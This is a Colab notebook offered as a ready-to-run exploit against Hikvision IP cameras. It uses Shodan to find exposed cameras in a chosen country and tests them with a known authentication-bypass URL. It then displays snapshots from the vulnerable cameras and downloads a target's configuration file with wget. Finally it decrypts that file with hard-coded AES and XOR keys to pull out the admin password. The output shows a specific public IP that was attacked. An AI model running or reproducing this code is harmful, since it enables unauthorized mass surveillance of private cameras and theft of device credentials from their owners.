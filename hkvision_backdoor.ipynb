{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyO7dCSdxjYs3wUy3LbC6FW+",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/saz-io/hkvision_backdoor_colab/blob/main/hkvision_backdoor.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "Hikvision IP Camera - Backdoor"
      ],
      "metadata": {
        "id": "84VPLrcbNE8w"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "### requirement"
      ],
      "metadata": {
        "id": "UphgiO_uPBJV"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install pycryptodome\n",
        "!pip install requests shodan\n",
        "import getpass\n",
        "import requests\n",
        "import shodan\n",
        "from itertools import cycle\n",
        "from Crypto.Cipher import AES\n",
        "import re\n",
        "import os\n",
        "import sys\n",
        "import requests\n",
        "from PIL import Image\n",
        "from io import BytesIO\n",
        "from IPython.display import display"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "d5searkc2LcO",
        "outputId": "7b53bfa4-4e73-444e-e96a-e1fe42fc5679"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Requirement already satisfied: pycryptodome in /usr/local/lib/python3.10/dist-packages (3.20.0)\n",
            "Requirement already satisfied: requests in /usr/local/lib/python3.10/dist-packages (2.31.0)\n",
            "Requirement already satisfied: shodan in /usr/local/lib/python3.10/dist-packages (1.31.0)\n",
            "Requirement already satisfied: charset-normalizer<4,>=2 in /usr/local/lib/python3.10/dist-packages (from requests) (3.3.2)\n",
            "Requirement already satisfied: idna<4,>=2.5 in /usr/local/lib/python3.10/dist-packages (from requests) (3.7)\n",
            "Requirement already satisfied: urllib3<3,>=1.21.1 in /usr/local/lib/python3.10/dist-packages (from requests) (2.0.7)\n",
            "Requirement already satisfied: certifi>=2017.4.17 in /usr/local/lib/python3.10/dist-packages (from requests) (2024.2.2)\n",
            "Requirement already satisfied: click in /usr/local/lib/python3.10/dist-packages (from shodan) (8.1.7)\n",
            "Requirement already satisfied: click-plugins in /usr/local/lib/python3.10/dist-packages (from shodan) (1.1.1)\n",
            "Requirement already satisfied: colorama in /usr/local/lib/python3.10/dist-packages (from shodan) (0.4.6)\n",
            "Requirement already satisfied: XlsxWriter in /usr/local/lib/python3.10/dist-packages (from shodan) (3.2.0)\n",
            "Requirement already satisfied: tldextract in /usr/local/lib/python3.10/dist-packages (from shodan) (5.1.2)\n",
            "Requirement already satisfied: requests-file>=1.4 in /usr/local/lib/python3.10/dist-packages (from tldextract->shodan) (2.0.0)\n",
            "Requirement already satisfied: filelock>=3.0.8 in /usr/local/lib/python3.10/dist-packages (from tldextract->shodan) (3.13.4)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "### shodan api"
      ],
      "metadata": {
        "id": "j_lnLCRdPNhD"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "API_KEY = input(\"Enter your Shodan API key: \")"
      ],
      "metadata": {
        "id": "POeLD4eh57fV"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "### Country code"
      ],
      "metadata": {
        "id": "Yrt0pXkrPTFd"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "country_code = input(\"Enter the country code to search for: \")"
      ],
      "metadata": {
        "id": "awQujnID6HtQ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "### Finding vunerable camera"
      ],
      "metadata": {
        "id": "_mA80HkvPV-a"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "dorks = ['''3.1.3.150324''', '''Server: App-webs/''', '''Content-Length: 1862''']\n",
        "exploitable = []\n",
        "list_of_links = []\n",
        "exploit_check = \"/Security/users?auth=YWRtaW46MTEK\"\n",
        "get_snapshot = \"/onvif-http/snapshot?auth=YWRtaW46MTEK\"\n",
        "\n",
        "api = shodan.Shodan(API_KEY)\n",
        "\n",
        "for dork in dorks:\n",
        "    result = api.search(dork)\n",
        "    country_results = [service for service in result['matches'] if service['location']['country_code'] == country_code]\n",
        "\n",
        "    for service in country_results:\n",
        "        ipx = service['ip_str']\n",
        "        portx = service['port']\n",
        "        if portx == \"80\":\n",
        "            full = f\"http://{ipx}\"\n",
        "            list_of_links.append(full)\n",
        "        elif portx == \"443\":\n",
        "            full = f\"https://{ipx}\"\n",
        "            list_of_links.append(full)\n",
        "        else:\n",
        "            full = f\"http://{ipx}:{portx}\"\n",
        "            list_of_links.append(full)\n",
        "\n",
        "    for link in list_of_links:\n",
        "        try:\n",
        "            x = requests.get(f'{link}{exploit_check}', timeout=3)\n",
        "            if x.status_code == 200:\n",
        "                exploitable.append(f'{link}{get_snapshot}')\n",
        "        except Exception:\n",
        "            pass\n",
        "\n",
        "for xddd in exploitable:\n",
        "    print(xddd)\n",
        "\n"
      ],
      "metadata": {
        "id": "QAg_Qbu86IzP"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "pBm9TESvPgry"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "### snapshots from the camera"
      ],
      "metadata": {
        "id": "9XeSyRpaPbXM"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def display_resized_image_from_url(url, size=(200, 200)):\n",
        "    response = requests.get(url)\n",
        "    try:\n",
        "        img = Image.open(BytesIO(response.content))\n",
        "        img.thumbnail(size)\n",
        "        display(img)\n",
        "    except Exception as e:\n",
        "        print(f\"Error displaying image from URL: {url}\")\n",
        "        print(f\"Error message: {str(e)}\")\n",
        "\n",
        "for url in exploitable:\n",
        "    print(url)\n",
        "    display_resized_image_from_url(url)"
      ],
      "metadata": {
        "id": "cu52SBg49RGt"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "camera_ip = input(\"Enter the IP address of the camera: \")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "FCxw2lYi80mU",
        "outputId": "dca99e7c-1829-40c8-ff7e-1a975a794645"
      },
      "execution_count": null,
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Enter the IP address of the camera: 50.35.78.213:80\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "### getting the config file of the camera"
      ],
      "metadata": {
        "id": "E-zdDFwYPjpD"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "url = f\"http://{camera_ip}/System/configurationFile?auth=YWRtaW46MTEK\"\n",
        "config_folder = 'config'\n",
        "\n",
        "if not os.path.exists(config_folder):\n",
        "    os.makedirs(config_folder)\n",
        "\n",
        "ip_address = re.search(r'\\d+\\.\\d+\\.\\d+\\.\\d+', camera_ip).group(0)\n",
        "file_name = os.path.join(config_folder, f\"config_{ip_address}\")\n",
        "os.system(f\"wget -O {file_name} {url}\")\n",
        "print(f\"Configuration file downloaded and saved as {file_name} 'COPY THE PATH FOR THE NEXT \")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ezBJDMRW7BnD",
        "outputId": "3a664444-047d-4a0b-927d-ce985e8f9988"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Configuration file downloaded and saved as 'config/config_50.35.78.213 'COPY THE PATH FOR THE NEXT \n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "### decrypting the config file"
      ],
      "metadata": {
        "id": "hC5qGczaPn4Z"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def add_to_16(s):\n",
        "    while len(s) % 16 != 0:\n",
        "        s += b'\\0'\n",
        "    return s\n",
        "\n",
        "def decrypt(ciphertext, hex_key='279977f62f6cfd2d91cd75b889ce0c9a'):\n",
        "    key = bytes.fromhex(hex_key)\n",
        "    ciphertext = add_to_16(ciphertext)\n",
        "    cipher = AES.new(key, AES.MODE_ECB)\n",
        "    plaintext = cipher.decrypt(ciphertext[AES.block_size:])\n",
        "    return plaintext.rstrip(b\"\\0\")\n",
        "\n",
        "def xore(data, key=bytearray([0x73, 0x8B, 0x55, 0x44])):\n",
        "    return bytes(a ^ b for a, b in zip(data, cycle(key)))\n",
        "\n",
        "def strings(file):\n",
        "    chars = r\"A-Za-z0-9/\\-:.,_$%'()[\\]<> \"\n",
        "    shortestReturnChar = 2\n",
        "    regExp = '[%s]{%d,}' % (chars, shortestReturnChar)\n",
        "    pattern = re.compile(regExp)\n",
        "    return pattern.findall(file)\n",
        "\n",
        "def find_words_after_admin(words_list):\n",
        "    words_after_admin = []\n",
        "    found_admin = False\n",
        "    for word in words_list:\n",
        "        if found_admin:\n",
        "            words_after_admin.append(word)\n",
        "            found_admin = False\n",
        "        if word.lower() == 'admin':\n",
        "            found_admin = True\n",
        "    return words_after_admin\n",
        "\n",
        "def main(config_file):\n",
        "    if not os.path.isfile(config_file):\n",
        "        return print(f'No valid config file provided to decrypt: {config_file}')\n",
        "    with open(config_file, 'rb') as f:\n",
        "        xor = xore(decrypt(f.read()))\n",
        "        result_list = strings(xor.decode('ISO-8859-1'))\n",
        "        print(\"Original list of words:\")\n",
        "        print(result_list)\n",
        "        words_after_admin = find_words_after_admin(result_list)\n",
        "        print(\"\\nWords after 'admin':\")\n",
        "        print(words_after_admin)\n",
        "\n",
        "if __name__ == '__main__':\n",
        "    config_file = input(\"Enter the path to the config file: \")\n",
        "    main(config_file)"
      ],
      "metadata": {
        "id": "y6noHAb_2hnH"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}